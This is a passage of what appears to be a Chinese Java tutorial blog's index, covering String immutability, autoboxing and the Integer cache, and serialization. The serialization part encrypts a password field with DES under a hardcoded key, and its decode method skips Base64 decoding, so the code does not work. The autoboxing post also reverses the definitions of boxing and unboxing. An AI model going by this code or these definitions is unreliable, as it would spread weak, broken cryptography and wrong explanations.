class=\"string\">&#x27;h&#x27;</span>);</span><br><span class=\"line\">    Array.set(chars, <span class=\"number\">2</span>, <span class=\"string\">&#x27;h&#x27;</span>);</span><br><span class=\"line\">    value.setAccessible(<span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (String s : set) &#123;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;%s hash is %d\\n&quot;</span>, s, s.hashCode());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//whh hash is 117687</span></span><br><span class=\"line\">    <span class=\"comment\">//whh hash is 118167</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过反射修改String内char数组的值，最终输出的字符串一样，但是其hashCode不一样。</p>\n<p>把String设计为不可变有几大优点：<br>1、在Java内存中存在一块常量池，<code>String a = &quot;whh&quot;;new String(&quot;whh&quot;).intern()</code>这种创建的对象会存入常量池中，当再次创建一个相同的对象时，会直接指向常量池中的地址，因为String在使用过程中非常频繁，可以通过常量池复用相同的字符串。<br>2、在String创建完毕后，该字符串的hash在创建时就已经计算完毕，方便直接使用，特别是Set中特别有用。如果String可变，在使用Set时，如果先存入<code>&quot;aaa&quot;, &quot;bbb&quot;</code>，之后修改<code>&quot;aaa&quot;</code>对象为<code>&quot;bbb&quot;</code>，因为String可变，所以在Set中现在是<code>&quot;bbb&quot;, &quot;bbb&quot;</code>，出现了重复数据。<br>3、并发安全，因为String不可变，所有可以在多线程中共享。</p>\n<p>注：String.intern是如果常量池存在着返回常量池中的对象，如果常量池不存在则把当前对象放入常量池（在常量池判断存在时类似equals比较）。</p>\n<p>在平常使用<code>String a=&quot;whh&quot;</code>时，创建的String存在与常量池中，如果使用<code>new String(&quot;whh&quot;)</code>，因为使用了<code>new</code>关键字，所以会告诉JVM在堆中开辟一块内存，用于存放创建的对象，所以在使用<code>==</code>时比较的事内存地址，一个在堆中一个在常量池中所以不会相等。</p>\n","categories":["Java基础"],"tags":["基础","String"]},{"title":"Java基础-基本类型","url":"/2018/03/22/Java%E5%9F%BA%E7%A1%80-%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/","content":"<p>JDK1.5中引入了自动拆装箱，方便基本类型和对象的转换。</p>\n<table>\n<thead>\n<tr>\n<th>基本类型</th>\n<th align=\"left\">对象</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>byte</td>\n<td align=\"left\">Byte</td>\n</tr>\n<tr>\n<td>short</td>\n<td align=\"left\">Short</td>\n</tr>\n<tr>\n<td>char</td>\n<td align=\"left\">Character</td>\n</tr>\n<tr>\n<td>int</td>\n<td align=\"left\">Integer</td>\n</tr>\n<tr>\n<td>long</td>\n<td align=\"left\">Long</td>\n</tr>\n<tr>\n<td>float</td>\n<td align=\"left\">Float</td>\n</tr>\n<tr>\n<td>double</td>\n<td align=\"left\">Double</td>\n</tr>\n<tr>\n<td>boolean</td>\n<td align=\"left\">Boolean</td>\n</tr>\n</tbody></table>\n<p>自动拆箱：基本类型转换为对象，一般通过类的静态方法<code>*Value()</code>转换，如Integer中<code>Integer.intValue(int)</code>;<br>自动装箱：把对象转换为相应的基本类型，一般是<code>对象.valueOf()</code>。</p>\n<span id=\"more\"></span>\n<p>自动拆装箱一般发生在基本类型和对象相互转换的时候。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main1</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] arg)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"variable\">sum</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"type\">Integer</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> sum;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"variable\">b</span> <span class=\"operator\">=</span> i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用<code>javap -c</code>反编译后：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Compiled from &quot;Main1.java&quot;</span><br><span class=\"line\">public class Main1 &#123;</span><br><span class=\"line\">  public Main1();</span><br><span class=\"line\">    Code:</span><br><span class=\"line\">       0: aload_0</span><br><span class=\"line\">       1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class=\"line\">       4: return</span><br><span class=\"line\"></span><br><span class=\"line\">  public void main(java.lang.String[]);</span><br><span class=\"line\">    Code:</span><br><span class=\"line\">       0: iconst_1</span><br><span class=\"line\">       1: istore_2</span><br><span class=\"line\">       2: iload_2</span><br><span class=\"line\">       3: invokestatic  #2                  // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class=\"line\">       6: astore_3</span><br><span class=\"line\">       7: aload_3</span><br><span class=\"line\">       8: invokevirtual #3                  // Method java/lang/Integer.intValue:()I</span><br><span class=\"line\">      11: istore        4</span><br><span class=\"line\">      13: return</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到编译后使用的是<code>Integer.valueOf</code>和<code>Integer.intValue</code>。</p>\n<p>自动拆装箱的时候有几个需要注意的地方：</p>\n<h4 id=\"方法重载\"><a href=\"#方法重载\" class=\"headerlink\" title=\"方法重载\"></a>方法重载</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        sout(<span class=\"number\">1</span>);</span><br><span class=\"line\">        sout(<span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>(<span class=\"number\">1</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sout</span><span class=\"params\">(<span class=\"type\">int</span> i)</span>&#123;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;int %d\\n&quot;</span>, i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sout</span><span class=\"params\">(Integer i)</span>&#123;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Integer %d\\n&quot;</span>, i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在使用int和Integer重载时，并不会自动拆装箱</p>\n<h4 id=\"对象多余的创建\"><a href=\"#对象多余的创建\" class=\"headerlink\" title=\"对象多余的创建\"></a>对象多余的创建</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Integer</span> <span class=\"variable\">sum</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10000</span>; i++)&#123;</span><br><span class=\"line\">  sum+=<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这种在反编译后可以每次相加的时候都会出现拆装箱，因为在Java中没有运算符重载，所以需要不同的解析拆装箱。</p>\n<h4 id=\"对象缓存\"><a href=\"#对象缓存\" class=\"headerlink\" title=\"对象缓存\"></a>对象缓存</h4><p>Integer自动装箱时，使用的事Integer.valueOf()，源码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Integer <span class=\"title function_\">valueOf</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> IntegerCache.cache[i + (-IntegerCache.low)];</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>(i);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>int在<code>-128~127</code>访问时，使用的Integer内缓存的值，这样就会出现如下问题：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Integer</span> <span class=\"variable\">a</span> <span class=\"operator\">=</span> <span class=\"number\">100</span>;</span><br><span class=\"line\"><span class=\"type\">Integer</span> <span class=\"variable\">b</span> <span class=\"operator\">=</span> <span class=\"number\">100</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Integer c= <span class=\"number\">1000</span>;</span><br><span class=\"line\"><span class=\"type\">Integer</span> <span class=\"variable\">d</span> <span class=\"operator\">=</span> <span class=\"number\">1000</span>;</span><br><span class=\"line\">System.out.println(a == b);<span class=\"comment\">// true</span></span><br><span class=\"line\">System.out.println(c == d);<span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n<p>注：在Double、Float并不会缓存。</p>\n<h4 id=\"和-equels\"><a href=\"#和-equels\" class=\"headerlink\" title=\"&#x3D;&#x3D; 和 equels\"></a>&#x3D;&#x3D; 和 equels</h4><p>因为对象不支持四则运算操作，所以在对象和基本类型运算时会发生拆箱；在对象和基本类型<code>==</code>比较时会发生拆箱；使用<code>equels</code>比较时，会发生装箱，因为equels参数为Object，虽然发生了装箱但是因为Integer重写了equels，比较Integer里面的值。</p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcm9pZHl1ZS5jb20vYmxvZy8yMDE1LzA0LzA3L2F1dG9ib3hpbmctYW5kLWF1dG91bmJveGluZy1pbi1qYXZhLw==\">Java中的自动装箱与拆箱<i class=\"fa fa-external-link-alt\"></i></span></p>\n","categories":["Java基础"],"tags":["基础","基本类型"]},{"title":"Java基础-序列化","url":"/2018/03/23/Java%E5%9F%BA%E7%A1%80-%E5%BA%8F%E5%88%97%E5%8C%96/","content":"<p>在一般应用创建对象，一般创建的对象存在JVM内存中，在JVM停止后该对象也会随之消失，如果需要对对象进行保存就需要对该对象进行序列化后进行保存。<br>在不同进程中通信，为了传输对象需要对对象进行序列后在不同进程中进行传输。</p>\n<p>所以序列化的目的就是为了<code>对象</code>的持久化以及传输。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"Serializable序列化\"><a href=\"#Serializable序列化\" class=\"headerlink\" title=\"Serializable序列化\"></a>Serializable序列化</h3><p>序列化举例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">4079296645005815685L</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer age;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name, Integer age)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Person&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;name=&#x27;&quot;</span> + name + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;, age=&quot;</span> + age +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">whh</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;whh&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;序列化对象：%s \\n&quot;</span>, whh);</span><br><span class=\"line\">        save(whh, <span class=\"string\">&quot;whh.out&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">load</span> <span class=\"operator\">=</span> load(<span class=\"string\">&quot;whh.out&quot;</span>);</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;序列化对象 反序列化对象比较： %s \\n&quot;</span>, whh == load);</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;反序列化对象：%s \\n&quot;</span>, load);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//输出</span></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">        序列化对象：Person&#123;name=&#x27;whh&#x27;, age=1&#125;</span></span><br><span class=\"line\"><span class=\"comment\">        序列化对象 反序列化对象比较： false</span></span><br><span class=\"line\"><span class=\"comment\">        反序列化对象：Person&#123;name=&#x27;whh&#x27;, age=1&#125;</span></span><br><span class=\"line\"><span class=\"comment\">        */</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">save</span><span class=\"params\">(Person person, String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">objectOutputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(filePath));</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            objectOutputStream.writeObject(person);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">load</span><span class=\"params\">(String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">objectInputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(filePath));</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (Person) objectInputStream.readObject();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在代码中Person是定义的测试类，实现Serializable标识可以进行序列化（如果没Serializable在使用jdk自带序列化时会出错）。从输出可以看出，序列化反序列化都成功了，反序列化后的对象和原有对象不是一个对象（枚举是同一个）。<br>可以通过ObjectOutputStream.writeObject0中可以看到在序列化的时候，判断顺序是String、Array、Enum、Serializable，如果4者都不是就会抛出序列化异常。</p>\n<h4 id=\"使用自带序列化时需要注意事项：\"><a href=\"#使用自带序列化时需要注意事项：\" class=\"headerlink\" title=\"使用自带序列化时需要注意事项：\"></a>使用自带序列化时需要注意事项：</h4><p>1、如果父类没有进行序列化，那么只有子类进行序列化，其父类不会序列化，而且父类必须存在一个无参构造方法，不然在反序列化的时候会出错<code>InvalidClassException:no valid constructor</code><br>2、如果序列化对象依赖属性未实现Serializable接口，那么在进行序列化时会出错。<br>3、<code>transient</code>修饰的属性不会进行序列化<br>4、静态属性不会进行序列化（静态属性属于类，不属于对象）<br>5、如果序列化和反序列化时类的ID不一致会导致反序列化失败(<code>local class incompatible: stream classdesc serialVersionUID = 1, local class serialVersionUID = 2</code>)，可以用于强制更新，如序列化在服务端，如果服务端修改了序列化后，需要客户端在获取服务端对象时无法反序列化对象，强制客户端从服务端更新类。</p>\n<p>第一条举例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Parent</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String work;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Parent</span><span class=\"params\">(String work)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.work = work;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getWork</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> work;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Parent</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">4079296645005815685L</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer age;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name, Integer age)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(<span class=\"string\">&quot;work&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Person&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;name=&#x27;&quot;</span> + name + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;, age=&quot;</span> + age +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">whh</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;whh&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        System.out.printf(whh.getWork());</span><br><span class=\"line\">        save(whh, <span class=\"string\">&quot;whh.out&quot;</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;~~~~&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">load</span> <span class=\"operator\">=</span> load(<span class=\"string\">&quot;whh.out&quot;</span>);</span><br><span class=\"line\">        System.out.println(load.getWork());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">save</span><span class=\"params\">(Person person, String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">objectOutputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(filePath));</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            objectOutputStream.writeObject(person);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">load</span><span class=\"params\">(String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">objectInputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(filePath));</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (Person) objectInputStream.readObject();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在运行时会报错，如果添加构造方法后，获取父类属性为null。</p>\n<h4 id=\"序列化加密\"><a href=\"#序列化加密\" class=\"headerlink\" title=\"序列化加密\"></a>序列化加密</h4><p>在序列化时，通过读取字节码是可以看到某些序列化后的值，如果对象中存有敏感信息，那么需要通过对序列化字段进行加密。<br>在序列化过程中，虚拟机会尝试调用对象的<code>writeObject</code>、<code>readObject</code>方法进行序列化和反序列化，如果未定义该方法，那么默认就是调用<code>ObjectOutputStream.efaultWriteObject</code>以及<code>ObjectInputStream.defaultReadObject</code>。通过自定义<code>writeObject</code>、<code>readObject</code>方法达到对数据进行加密的效果。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 参考：http://hello-nick-xu.iteye.com/blog/2103775</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DESUtils</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">String</span> <span class=\"variable\">key</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;ABCDEFGHIJK&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">encode</span><span class=\"params\">(String val)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">//生成密钥</span></span><br><span class=\"line\">        <span class=\"type\">DESKeySpec</span> <span class=\"variable\">keySpec</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DESKeySpec</span>(key.getBytes());</span><br><span class=\"line\">        <span class=\"type\">SecretKeyFactory</span> <span class=\"variable\">keyFactory</span> <span class=\"operator\">=</span> SecretKeyFactory.getInstance(<span class=\"string\">&quot;des&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">SecretKey</span> <span class=\"variable\">secretKey</span> <span class=\"operator\">=</span> keyFactory.generateSecret(keySpec);</span><br><span class=\"line\">        <span class=\"comment\">//加密</span></span><br><span class=\"line\">        <span class=\"type\">Cipher</span> <span class=\"variable\">cipher</span> <span class=\"operator\">=</span> Cipher.getInstance(<span class=\"string\">&quot;des&quot;</span>);</span><br><span class=\"line\">        cipher.init(Cipher.ENCRYPT_MODE, secretKey, <span class=\"keyword\">new</span> <span class=\"title class_\">SecureRandom</span>());</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] cipherData = cipher.doFinal(val.getBytes());</span><br><span class=\"line\">        <span class=\"comment\">//base</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BASE64Encoder</span>().encode(cipherData);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">decode</span><span class=\"params\">(String val)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (val == <span class=\"literal\">null</span>) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NullPointerException</span>(<span class=\"string\">&quot;参数为空&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//生成密钥</span></span><br><span class=\"line\">        <span class=\"type\">DESKeySpec</span> <span class=\"variable\">keySpec</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DESKeySpec</span>(key.getBytes());</span><br><span class=\"line\">        <span class=\"type\">SecretKeyFactory</span> <span class=\"variable\">keyFactory</span> <span class=\"operator\">=</span> SecretKeyFactory.getInstance(<span class=\"string\">&quot;des&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">SecretKey</span> <span class=\"variable\">secretKey</span> <span class=\"operator\">=</span> keyFactory.generateSecret(keySpec);</span><br><span class=\"line\">        <span class=\"comment\">//解密</span></span><br><span class=\"line\">        <span class=\"type\">Cipher</span> <span class=\"variable\">cipher</span> <span class=\"operator\">=</span> Cipher.getInstance(<span class=\"string\">&quot;des&quot;</span>);</span><br><span class=\"line\">        cipher.init(Cipher.DECRYPT_MODE, secretKey, <span class=\"keyword\">new</span> <span class=\"title class_\">SecureRandom</span>());</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] plainData = cipher.doFinal(val.getBytes());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(plainData);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer age;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String password;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name, String password, Integer age)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.password = password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">writeObject</span><span class=\"params\">(ObjectOutputStream out)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">//加密</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">encode</span> <span class=\"operator\">=</span> DESUtils.encode(<span class=\"built_in\">this</span>.password);</span><br><span class=\"line\">        ObjectOutputStream.<span class=\"type\">PutField</span> <span class=\"variable\">putField</span> <span class=\"operator\">=</span> out.putFields();</span><br><span class=\"line\">        putField.put(<span class=\"string\">&quot;name&quot;</span>, <span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">        putField.put(<span class=\"string\">&quot;age&quot;</span>, <span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">        putField.put(<span class=\"string\">&quot;password&quot;</span>, encode);</span><br><span class=\"line\">        out.writeFields();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title 